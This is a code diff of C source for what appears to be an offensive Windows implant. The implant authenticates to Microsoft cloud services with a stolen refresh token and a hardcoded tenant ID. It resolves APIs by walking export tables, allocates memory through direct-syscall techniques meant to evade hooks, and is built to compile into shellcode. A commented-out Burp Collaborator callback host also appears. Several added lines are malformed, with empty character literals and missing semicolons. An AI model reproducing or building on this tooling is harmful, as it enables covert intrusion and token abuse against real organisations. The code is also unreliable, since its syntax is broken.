@@ -113,11 +113,21 @@ void parseMetaCommand(msvcrtStruct strFuncs, char* command, metaCommandStruct* c
 
 int main() {
     // Variables
-    char refreshToken[] = "REPLACE THIS";
-    char tenantId[]     = "REPLACE THIS";
-    // char tenantId[]     = "1d5551a0-f4f2-4101-9c3b-394247ec7e08";
+    // If compiling to an EXE you can just use the one refreshToken array. If so, comment out rt array and lines 312 to 326
+    //char refreshToken[] = "REPLACE THIS";
+    // Put the Refresh token in these CHAR arrays. Had to break up the token to different arrays. 
+    // If it one massive array GCC ming will put it in the BSS section instead of the TEXT section. This will cause the shellcode creation to fail
+    CHAR refreshToken1[] = {''};
+    CHAR refreshToken2[] = {''}
+    CHAR refreshToken3[] = {''}
+    CHAR refreshToken4[] = {''}
+    CHAR refreshToken5[] = {''}
+    CHAR refreshToken6[] = {''}
+    CHAR refreshToken7[] = {''}
+    //char tenantId[]     = "REPLACE THIS";
+    //char tenantId[]     = "1d5551a0-f4f2-4101-9c3b-394247ec7e08";
     // bobby.cooke$ python3 string2Array.py tenantId "1d5551a0-f4f2-4101-9c3b-394247ec7e08"
-    //CHAR tenantId[] = {'1','d','5','5','5','1','a','0','-','f','4','f','2','-','4','1','0','1','-','9','c','3','b','-','3','9','4','2','4','7','e','c','7','e','0','8',0};
+    CHAR tenantId[] = {'1','d','5','5','5','1','a','0','-','f','4','f','2','-','4','1','0','1','-','9','c','3','b','-','3','9','4','2','4','7','e','c','7','e','0','8',0};
     DWORD napTime       = 20000; // second sleep
     //char sitename[]     = "login.microsoftonline.com";
     //char sitename[]   = "h1jmj59wadg8l8taczm6fpzolfr5fu.burpcollaborator.net"; 
@@ -300,7 +310,7 @@ int main() {
     comms.InternetCloseHandle = (tInternetCloseHandle)getSymbolAddress(InternetCloseHandleStr, (PVOID)sizeof(InternetCloseHandleStr), wininet, wininetExAddrTable, wininetExNamePointerTable, wininetExOrdinalTable);
     // Allocate Memory Buffers
     // Allocate refreshToken
-/*	ULONG rtBuffSize = 1 << 13;
+	ULONG rtBuffSize = 1 << 13;
 	PVOID refreshToken = NULL;
 	SIZE_T refreshTokenSize = (SIZE_T)rtBuffSize;
     // NtAllocateVirtualMemory via HellsGate & HalosGate
@@ -313,7 +323,7 @@ int main() {
     k32.lstrcatA(refreshToken,refreshToken4);
     k32.lstrcatA(refreshToken,refreshToken5);
     k32.lstrcatA(refreshToken,refreshToken6);
-    k32.lstrcatA(refreshToken,refreshToken7);*/
+    k32.lstrcatA(refreshToken,refreshToken7);
     // Allocate AccessToken
 	ULONG atBuffSize = 1 << 13;
 	PVOID accessTokenBuffer = NULL;
